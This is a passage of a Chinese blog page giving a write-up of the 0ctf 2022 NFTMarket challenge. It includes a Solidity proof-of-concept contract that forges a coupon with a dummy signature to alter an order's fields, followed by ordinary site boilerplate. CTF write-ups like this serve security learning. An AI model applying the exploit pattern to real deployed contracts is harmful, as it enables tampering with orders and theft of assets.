     order.tokenId = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        order.price = <span class="number">0xcafebabe</span>;</span><br><span class="line">        bytes memory serialized = abi.encode(</span><br><span class="line">            <span class="string">"I, the issuer"</span>, coupon.issuer,</span><br><span class="line">            <span class="string">"offer a special discount for"</span>, coupon.user,</span><br><span class="line">            <span class="string">"to buy"</span>, order, <span class="string">"at"</span>, coupon.newprice,</span><br><span class="line">            <span class="string">"because"</span>, coupon.reason</span><br><span class="line">        );</span><br><span class="line">        recovered = ecrecover(keccak256(serialized), sig.v, sig.rs[<span class="number">0</span>], sig.rs[<span class="number">1</span>]);</span><br><span class="line">        issuer = coupon.issuer; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract caller&#123;</span><br><span class="line">    Verifier public verifier;</span><br><span class="line">    Coupon public cp;</span><br><span class="line">    <span class="keyword">constructor</span>(address v)&#123;</span><br><span class="line">        verifier = Verifier(v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">purchaseWithCoupon</span>(<span class="params">SignedCoupon calldata scoupon</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        Coupon memory coupon = scoupon.coupon;</span><br><span class="line">        <span class="built_in">require</span>(coupon.user == msg.sender, <span class="string">"Invalid user"</span>);</span><br><span class="line">        <span class="built_in">require</span>(coupon.newprice &gt; <span class="number">0</span>, <span class="string">"Invalid price"</span>);</span><br><span class="line">        verifier.verifyCoupon(scoupon);</span><br><span class="line">        cp = coupon;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        Coupon memory c;</span><br><span class="line">        c.orderId = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        c.newprice = <span class="number">1</span>;</span><br><span class="line">        c.issuer = address(<span class="number">0x123456</span>);</span><br><span class="line">        c.user = address(<span class="keyword">this</span>);</span><br><span class="line">        c.reason = <span class="string">'lalalalalaallalalalaalallalalalalalalalaalaalalala'</span>;</span><br><span class="line">        SignedCoupon memory scoupon;</span><br><span class="line">        scoupon.coupon = c;</span><br><span class="line"></span><br><span class="line">        Signature memory sig;</span><br><span class="line">        sig.v = <span class="number">17</span>;</span><br><span class="line">        sig.rs[<span class="number">1</span>] = bytes32(<span class="number">0</span>);</span><br><span class="line">        sig.rs[<span class="number">0</span>] = bytes32(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        scoupon.signature = sig;</span><br><span class="line">        caller(<span class="keyword">this</span>).purchaseWithCoupon(scoupon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接调用test，在remix上测试结果如下：</p>
+<p><img src="https://s3cunda.github.io/assets/post/nft.png" alt="image-20220919130423963"></p>
+<p>可以看到，orderId确实是被改成0了。</p>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/EKO-Phoenixtto/" data-toggle="tooltip" data-placement="top" title="CTF-EKO-Phoenixtto">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/code-analysis3/" data-toggle="tooltip" data-placement="top" title="EVM源码分析（三）">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+                <div class="comment_notes_blank"></div>
+                <div class="visitor_notice">
+                    <img 
+                        src="/img/notice.png" 
+                        alt="notice"
+                        title="notice"/>
+                    <p class="notice">
+                        true
+                    </p>
+                </div>
+                
+
+                
+                <div class="comment_notes">
+                    <p>
+                        This is copyright.
+                    </p>
+                </div>
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                
+<link rel="stylesheet" href="../css/music-player/fonts/iconfont.css">
+
+
+<link rel="stylesheet" href="../css/music-player/css/reset.css">
+
+
+<link rel="stylesheet" href="../css/music-player/css/player.css">
+
+
+<div class="music-player">
+    <audio class="music-player__audio" ></audio>
+    <div class="music-player__main">
+        <div class="music-player__blur"></div>
+        <div class="music-player__disc">
+            <div class="music-player__image">
+                <img width="100%" src="" alt="">
+            </div>
+            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
+        </div>
+        <div class="music-player__controls">
+            <div class="music__info">
+                <h3 class="music__info--title">...</h3>
+                <p class="music__info--singer">...</p>
+            </div>
+            <div class="player-control">
+                <div class="player-control__content">
+                    <div class="player-control__btns">
+                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
+                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
+                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
+                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
+                    </div>
+                    <div class="player-control__volume">
+                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
+                        <div class="control__volume--progress player_progress"></div>
+                    </div>
+                </div>
+                <div class="player-control__content">
+                    <div class="player__song--progress player_progress"></div>
+                    <div class="player__song--timeProgess nowTime">00:00</div>
+                    <div class="player__song--timeProgess totalTime">00:00</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="../js/music-player/utill.js"></script>
+
+
+<script src="../js/music-player/jquery.min.js"></script>
+
+<!-- netease; qqkg -->
+<!--
+<script src="../js/music-player/player.js?library=config.music.library.js"></script>
+-->
+<script src="../../../../js/music-player/player.js?library=netease&music=https://kg.qq.com/node/play?s=7deFpz7Z26Jmv7di&g_f=share_html"></script>
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      
+        <aside id="sidebar">
+          <div id="toc" class="toc-article">
+          <strong class="toc-title">Contents</strong>
+          
+            
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#0ctf-2022-NFTMarket"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">0ctf-2022-NFTMarket</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#题目合约"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">题目合约</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#分析"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">分析</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#尝试"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">尝试</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#如何改价格"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">如何改价格</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#正解"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">正解</span></a></li></ol></li></ol>
+            
+          
+          </div>
+        </aside>
+      
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#杂谈" title="杂谈">杂谈</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/ThomasXu-blockchain">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Thomas_Xu 2023 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="../js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="../js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="../js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="../js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://thomasxu-blockchain.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&quot;🍰&quot;,&quot;当大潮褪去，才知道谁在裸泳&quot;,&quot;🍭&quot;]' color='[&quot;rgb(121,93,179)&quot; ,&quot;rgb(76,180,231)&quot; ,&quot;rgb(184,90,154)&quot;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+
+</html>
